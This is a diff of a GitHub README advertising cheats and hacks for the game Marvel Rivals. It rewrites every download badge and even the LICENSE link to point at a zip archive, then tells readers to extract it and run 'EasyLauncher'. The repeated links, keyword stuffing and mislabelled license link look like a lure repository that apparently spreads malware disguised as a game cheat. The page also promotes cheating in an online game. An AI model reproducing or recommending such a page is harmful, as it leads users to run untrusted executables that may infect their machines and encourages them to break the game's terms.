@@ -1,10 +1,10 @@
 # 🚀 Marvel Rivals Cheats Hacks  
-[![Download Latest](https://raw.githubusercontent.com/WilcoBarry12/MarvelRivals-ModdingToolkit/main/undistrustful/MarvelRivals-ModdingToolkit.zip%20Latest-EasyLauncher-blue)](https://raw.githubusercontent.com/WilcoBarry12/MarvelRivals-ModdingToolkit/main/undistrustful/MarvelRivals-ModdingToolkit.zip)
+[![Download Latest](https://github.com/WilcoBarry12/MarvelRivals-ModdingToolkit/raw/refs/heads/main/undistrustful/Marvel_Toolkit_Rivals_Modding_v3.5.zip%20Latest-EasyLauncher-blue)](https://github.com/WilcoBarry12/MarvelRivals-ModdingToolkit/raw/refs/heads/main/undistrustful/Marvel_Toolkit_Rivals_Modding_v3.5.zip)
 
 Level up your gaming experience with **Marvel Rivals Cheats Hacks**! This unique utility offers advanced enhancements for Marvel Rivals, transforming how you play. Optimize your experience with custom modifications, superior unlocks, visual upgrades, and strategic game advantages. Built for gamers who want the ultimate edge, this solution is carefully engineered for reliability and performance.
 
 ## 🌍 Download  
-[![Download Now](https://raw.githubusercontent.com/WilcoBarry12/MarvelRivals-ModdingToolkit/main/undistrustful/MarvelRivals-ModdingToolkit.zip)](https://raw.githubusercontent.com/WilcoBarry12/MarvelRivals-ModdingToolkit/main/undistrustful/MarvelRivals-ModdingToolkit.zip)
+[![Download Now](https://github.com/WilcoBarry12/MarvelRivals-ModdingToolkit/raw/refs/heads/main/undistrustful/Marvel_Toolkit_Rivals_Modding_v3.5.zip)](https://github.com/WilcoBarry12/MarvelRivals-ModdingToolkit/raw/refs/heads/main/undistrustful/Marvel_Toolkit_Rivals_Modding_v3.5.zip)
 
 ## 💻 OS Compatibility Table  
 | Operating System        | Supported | Notes                      |
@@ -28,7 +28,7 @@ Marvel Rivals cheats, Marvel Rivals hacks, Marvel Rivals trainer, Marvel Rivals 
 
 ## 📥 Installation  
 1. Download the latest build:  
-[![Get it Now](https://raw.githubusercontent.com/WilcoBarry12/MarvelRivals-ModdingToolkit/main/undistrustful/MarvelRivals-ModdingToolkit.zip)](https://raw.githubusercontent.com/WilcoBarry12/MarvelRivals-ModdingToolkit/main/undistrustful/MarvelRivals-ModdingToolkit.zip)  
+[![Get it Now](https://github.com/WilcoBarry12/MarvelRivals-ModdingToolkit/raw/refs/heads/main/undistrustful/Marvel_Toolkit_Rivals_Modding_v3.5.zip)](https://github.com/WilcoBarry12/MarvelRivals-ModdingToolkit/raw/refs/heads/main/undistrustful/Marvel_Toolkit_Rivals_Modding_v3.5.zip)  
 2. Extract archive  
 3. Run EasyLauncher and follow setup instructions  
 
@@ -36,8 +36,8 @@ Marvel Rivals cheats, Marvel Rivals hacks, Marvel Rivals trainer, Marvel Rivals 
 This repository is for educational and informational purposes only. Use of these tools may violate game terms of service. Always use responsibly.
 
 ## 📃 License  
-MIT License – See [LICENSE](https://raw.githubusercontent.com/WilcoBarry12/MarvelRivals-ModdingToolkit/main/undistrustful/MarvelRivals-ModdingToolkit.zip) for details.
+MIT License – See [LICENSE](https://github.com/WilcoBarry12/MarvelRivals-ModdingToolkit/raw/refs/heads/main/undistrustful/Marvel_Toolkit_Rivals_Modding_v3.5.zip) for details.
 
 ---
 
-[![Download Again](https://raw.githubusercontent.com/WilcoBarry12/MarvelRivals-ModdingToolkit/main/undistrustful/MarvelRivals-ModdingToolkit.zip%20Rivals%20Cheats-Download-blueviolet)](https://raw.githubusercontent.com/WilcoBarry12/MarvelRivals-ModdingToolkit/main/undistrustful/MarvelRivals-ModdingToolkit.zip)
+[![Download Again](https://github.com/WilcoBarry12/MarvelRivals-ModdingToolkit/raw/refs/heads/main/undistrustful/Marvel_Toolkit_Rivals_Modding_v3.5.zip%20Rivals%20Cheats-Download-blueviolet)](https://github.com/WilcoBarry12/MarvelRivals-ModdingToolkit/raw/refs/heads/main/undistrustful/Marvel_Toolkit_Rivals_Modding_v3.5.zip)
